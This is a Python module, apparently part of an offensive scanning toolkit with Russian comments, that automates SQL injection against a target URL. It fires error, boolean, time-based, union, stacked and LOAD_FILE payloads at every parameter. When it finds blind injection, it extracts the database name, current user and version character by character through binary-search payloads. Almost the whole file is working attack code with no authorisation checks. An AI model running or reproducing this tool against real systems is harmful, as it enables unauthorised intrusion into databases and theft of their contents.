"""sqli v7 — all techniques: error/time/boolean/union/stacked + blind extract"""
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient


ERROR_MARKERS = [
    "sql syntax", "mysql_fetch", "mysqli", "pg_query", "pg_exec", "sqlite3",
    "ora-", "microsoft ole db", "odbc sql", "postgresql", "sqlstate",
    "unclosed quotation", "quoted string not properly terminated",
    "you have an error in your sql", "warning: mysql", "mysql_num_rows",
    "division by zero", "invalid query", "sql command not properly ended",
    "jdbc", "java.sql", "ora-01756", "ora-00933",
]

# Профильные payload'ы (5-7 целевых, не 667)
PROBES = [
    ("error_single",  "'",                            "error"),
    ("error_double",  '"',                            "error"),
    ("error_paren",   "')",                           "error"),
    ("bool_true",     "' AND '1'='1",                 "boolean"),
    ("bool_false",    "' AND '1'='2",                 "boolean"),
    ("bool_num_true", " AND 1=1",                     "boolean"),
    ("bool_num_false"," AND 1=2",                     "boolean"),
    ("time_sleep",    "' AND SLEEP(3)-- -",           "time"),
    ("time_pg",       "'; SELECT pg_sleep(3)-- -",    "time"),
    ("time_waitfor",  "'; WAITFOR DELAY '0:0:3'-- -", "time"),
    ("time_bench",    "' AND BENCHMARK(5000000,MD5(1))-- -", "time"),
    ("union_1",       "' UNION SELECT NULL-- -",      "union"),
    ("union_2",       "' UNION SELECT NULL,NULL-- -","union"),
    ("stacked",       "'; SELECT 1-- -",              "stacked"),
    ("outofband",     "' AND LOAD_FILE('/etc/hostname')-- -", "oob"),
]


class Sqli:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"id": ["1"]}
        http = HttpClient(session, logger)

        # baseline
        base = http.get(target)
        if not base:
            print("[sqli] no baseline")
            return {}
        base_len = len(base.content)
        base_time_avg = self._baseline_time(http, target, samples=2)

        print(f"[sqli v7] target: {target}")
        print(f"[sqli v7] baseline: {base.status_code} {base_len}b avg={base_time_avg:.2f}s")
        print(f"[sqli v7] params: {list(params.keys())}")
        print(f"[sqli v7] probes: {len(PROBES)}")
        print()

        findings = []
        vuln_param = None
        vuln_type = None

        for name in params:
            original = params[name][0]
            print(f"[param: {name}]")

            # Group probes by type
            results = {}
            for pname, payload, ptype in PROBES:
                url = self._url(u, params, name, payload)
                t0 = time.time()
                r = http.get(url)
                dt = time.time() - t0
                if not r:
                    continue

                low = r.text.lower()
                size = len(r.content)

                # error check
                if ptype == "error":
                    for m in ERROR_MARKERS:
                        if m in low:
                            results.setdefault("error", []).append({
                                "payload": payload, "marker": m, "code": r.status_code,
                            })
                            print(f"  ✓ ERROR: {pname} → {m}")
                            logger.finding("sqli_error", "high",
                                           f"{name}={payload[:40]} marker={m}")
                            break

                # boolean check — compare true/false
                if ptype == "boolean":
                    # paired — храним для сравнения
                    results.setdefault("boolean", []).append({
                        "payload": payload, "size": size, "name": pname,
                    })

                # time check
                if ptype == "time" and dt > base_time_avg + 2.5:
                    results.setdefault("time", []).append({
                        "payload": payload, "delay": round(dt, 2),
                    })
                    print(f"  ✓ TIME: {pname} delay={dt:.2f}s")
                    logger.finding("sqli_time", "high",
                                   f"{name}={payload[:40]} delay={dt:.2f}s")

                # union check — success если ответ изменился и содержит NULL
                if ptype == "union" and size > 0:
                    if size != base_len and abs(size - base_len) > 50:
                        results.setdefault("union", []).append({
                            "payload": payload, "size": size, "diff": size - base_len,
                        })
                        print(f"  ✓ UNION: {pname} diff={size-base_len:+d}b")
                        logger.finding("sqli_union", "high",
                                       f"{name}={payload[:40]} diff={size-base_len}")
                        vuln_type = "union"
                        vuln_param = name
                        break

                # stacked — если нет ошибки на "';"
                if ptype == "stacked":
                    if not any(m in low for m in ["syntax error", "sql state"]):
                        results.setdefault("stacked", []).append({"payload": payload})
                        print(f"  ~ STACKED possible: {pname}")

                # oob — если LOAD_FILE вернул не ошибку
                if ptype == "oob" and "load_file" not in low and "denied" not in low:
                    if size != base_len:
                        results.setdefault("oob", []).append({"payload": payload})

            # boolean analysis — compare true/false pairs
            bool_probes = results.get("boolean", [])
            if len(bool_probes) >= 2:
                for i in range(0, len(bool_probes) - 1, 2):
                    t_probe = bool_probes[i]
                    f_probe = bool_probes[i + 1]
                    diff = abs(t_probe["size"] - f_probe["size"])
                    if diff > 100:
                        print(f"  ✓ BOOLEAN BLIND: true/false diff={diff}b")
                        findings.append({
                            "param": name, "type": "boolean_blind",
                            "confidence": 70, "diff": diff,
                        })
                        logger.finding("sqli_boolean", "high",
                                       f"{name} true/false diff={diff}")
                        vuln_param = name
                        if not vuln_type:
                            vuln_type = "boolean"

            # summary per param
            for t in results:
                if results[t]:
                    findings.append({
                        "param": name, "type": t,
                        "count": len(results[t]),
                        "probes": results[t][:3],
                    })
                    if t == "error" and not vuln_param:
                        vuln_param = name
                        vuln_type = "error"
                    elif t == "time" and not vuln_param:
                        vuln_param = name
                        vuln_type = "time"

        print()
        print(f"[sqli v7] findings: {len(findings)}")
        if vuln_param:
            print(f"[sqli v7] vulnerable: {vuln_param} ({vuln_type})")

        # если нашли blind — запускаем extraction
        if vuln_param and vuln_type in ("boolean", "time"):
            print(f"\n[sqli v7] blind injection detected — extracting via binary search")
            self._blind_extract(http, u, params, vuln_param, vuln_type,
                                base_len, base_time_avg, logger)

        return {"findings": findings, "param": vuln_param, "type": vuln_type}

    def _baseline_time(self, http, url, samples=2):
        times = []
        for _ in range(samples):
            t0 = time.time()
            http.get(url)
            times.append(time.time() - t0)
            time.sleep(0.15)
        return sum(times) / len(times) if times else 0.5

    def _blind_extract(self, http, u, params, param, vtype, base_len, base_time, logger):
        """Binary search extraction via boolean/time."""
        queries = [
            ("database",     "database()"),
            ("user",         "current_user()"),
            ("version",      "version()"),
        ]
        for qname, expr in queries:
            print(f"  [{qname}] extracting...", flush=True)
            result = ""
            for pos in range(1, 33):
                c = self._binary_char(http, u, params, param, expr, pos,
                                       vtype, base_len, base_time)
                if not c or c == 0:
                    break
                result += chr(c)
                print(f"    pos {pos}: '{chr(c)}' → '{result}'")
            if result.strip():
                print(f"  ✓ {qname} = {result.strip()}")
                logger.finding("sqli_extract", "critical", f"{qname}={result.strip()}")

    def _binary_char(self, http, u, params, param, query, pos, vtype, base_len, base_time):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
            url = self._url(u, params, param, payload)

            if vtype == "boolean":
                t0 = time.time()
                r = http.get(url)
                if not r:
                    return 0
                # TRUE = response same as baseline
                if abs(len(r.content) - base_len) < 100:
                    lo = mid + 1
                else:
                    hi = mid - 1
            else:  # time
                t0 = time.time()
                http.get(url)
                dt = time.time() - t0
                if dt > base_time + 2.0:
                    lo = mid + 1
                else:
                    hi = mid - 1

        return lo if 32 < lo < 127 else 0

    def _url(self, u, params, name, payload):
        q = dict(params); q[name] = [payload]
        return urlunparse(u._replace(query=urlencode(q, doseq=True)))
